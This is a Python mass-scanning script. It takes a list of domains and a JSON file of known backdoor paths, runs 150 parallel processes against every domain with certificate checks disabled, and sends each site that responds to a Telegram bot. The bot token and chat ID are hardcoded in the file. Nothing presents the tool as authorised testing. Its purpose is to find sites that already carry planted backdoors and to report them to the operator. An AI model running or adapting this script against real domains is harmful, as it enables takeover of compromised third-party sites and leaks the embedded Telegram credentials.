import requests
import json
import os
import multiprocessing
from functools import partial

# Load your Telegram bot token and chat ID
TELEGRAM_BOT_TOKEN = '7307593847:AAHUAaJJ3igyif9fuZNlv-sT_V4488I-M9Y'
TELEGRAM_CHAT_ID = '6444692754'

# ANSI escape sequences for colored output
RED = '\033[91m'
GREEN = '\033[92m'
RESET = '\033[0m'

def load_domains(file_path):
    try:
        with open(file_path, 'r') as file:
            domains = [line.strip() for line in file.readlines()]
        return domains
    except FileNotFoundError:
        print(f"{RED}Error: {file_path} not found.{RESET}")
        return []

def load_exploits(json_path):
    try:
        with open(json_path, 'r') as file:
            exploits = json.load(file)
        return exploits['backdoors']
    except (FileNotFoundError, json.JSONDecodeError) as e:
        print(f"{RED}Error loading exploits: {e}{RESET}")
        return []

def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    try:
        requests.post(url, data=payload)
    except requests.RequestException as e:
        print(f"{RED}Failed to send message: {e}{RESET}")

def check_vulnerability(domain, exploit):
    vulnerabilities = []
    paths = exploit['path'] if isinstance(exploit['path'], list) else [exploit['path']]
    for path in paths:
        url = f"{domain}{path}"
        try:
            response = requests.get(url, timeout=5, verify=False)
            if exploit['expected_string'] in response.text:
                vulnerabilities.append({
                    "domain": domain,
                    "path": path
                })
                print(f"{GREEN}Success: {url}{RESET}")
                send_telegram_message(f"Vulnerability : {url}")
            else:
                print(f"{RED}Not vulnerable : {url}{RESET}")
        except requests.RequestException as e:
            print(f"{RED}Error accessing {url} : {e}{RESET}")
    return vulnerabilities

def scan_domain_exploits(domain, exploits):
    vulnerabilities = []
    for exploit in exploits:
        result = check_vulnerability(domain, exploit)
        if result:
            vulnerabilities.extend(result)
    return vulnerabilities

def main():
    # Ask user for the domain input file
    domains_file = input("Enter list : ").strip()
    
    # Check if the provided file exists
    if not os.path.exists(domains_file):
        print(f"{RED}Error: {domains_file} not found.{RESET}")
        return

    exploits_file = 'exploit-cs.json'
    
    if not os.path.exists(exploits_file):
        print(f"{RED}Error: {exploits_file} not found.{RESET}")
        return

    domains = load_domains(domains_file)
    if not domains:
        return

    exploits = load_exploits(exploits_file)
    if not exploits:
        return

    with multiprocessing.Pool(150) as pool:
        scan_func = partial(scan_domain_exploits, exploits=exploits)
        results = pool.map(scan_func, domains)

    result_list = [vuln for sublist in results for vuln in sublist]

    if result_list:
        print("Vulnerable :")
        for site in result_list:
            print(f"{GREEN}{site['domain']}{site['path']}{RESET}")
        print("Results sent to Telegram.")
    else:
        print(f"{RED}No vulnerable.{RESET}")

if __name__ == '__main__':
    # Disable SSL warnings
    requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
    main()
